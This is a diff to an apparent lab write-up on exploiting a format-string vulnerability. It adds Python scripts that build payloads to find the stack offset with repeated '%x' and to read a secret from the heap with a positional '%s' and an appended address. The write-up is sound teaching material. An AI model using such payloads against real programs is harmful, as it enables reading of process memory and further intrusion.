@@ -753,12 +753,65 @@ A method I have taken to solve this problem is to place the 64-bit addresses aft
 
 #### Printing Out Stack Data
 
-When we use the "%x" format specifier, it instructs the program to access a memoey location and print out the hex value of the contents in that memory location. For this task we would need to build our input to the server such that when the values in memory are printed, we can tell the offset from the beginning of the stack.
+When we use the "%x" format specifier, it instructs the program to access a memory location and print out the hex value of the contents in that memory location. For this task we would need to build our input to the server such that when the values in memory are printed, we can tell the offset from the beginning of the stack.
 
-Thus our input will start with a value we know i.e. AAAA = \x41\x41\x41\x41 and will be made up of an increasing number of "%x" until we are able to see the value \x41\x41\x41\x41 printed out.
+Thus our input will start with a value we know i.e. AAAAAAAA = \x41\x41\x41\x41\x41\x41\x41\x41 and will be made up of an increasing number of "%x" until we are able to see the value \x41\x41\x41\x41 printed out.
+
+```python
+#!/usr/bin/python3
+import sys
+
+# Start input with a content we can easily recognize
+content = ("AAAAAAAA").encode('latin-1')
+
+# Append format specifiers
+content += ("_%x" * 40).encode('latin-1')
+
+# Append a newline
+content += ("\n").encode('latin-1')
 
 
+# Write the content to badfile
+with open('badfile', 'wb') as f:
+  print(f"writing {len(content)} bytes to badfile...")
+  f.write(content)
+```
 
+**image**
+
+After a number of trial and error, I was able to determine that the offset of our input from the beginning of the stack is 34. Thus, it will take 34 %x to print out the first eight bytes of my input.
+
+
+#### Printing Out Heap Data
+
+There is a secret message that is stored on the heap when the program runs. We know that the memory address of this secret message on the heap is 0x0000555555556008. In order to print out the value stored in this memory address, while constructing our format string, we will have to put 0x0000555555556008 after all the format specifiers.
+
+Our initial code that achieves this is:
+
+```python
+#!/usr/bin/python3
+import sys
+
+secret = 0x0000555555556008
+
+# Start the string with the format specifiers
+# I padded zeros to keep the lenght at 8-bytes
+content = ("%00035$s").encode('latin-1')
+
+# Append the address
+content += (secret).to_bytes(8,byteorder='little')
+
+# Append a newline
+content += ("\n").encode('latin-1')
+
+
+# Write the content to badfile
+with open('badfile', 'wb') as f:
+  print(f"writing {len(content)} bytes to badfile...")
+  f.write(content)
+```
+
+**image**
 
 
 
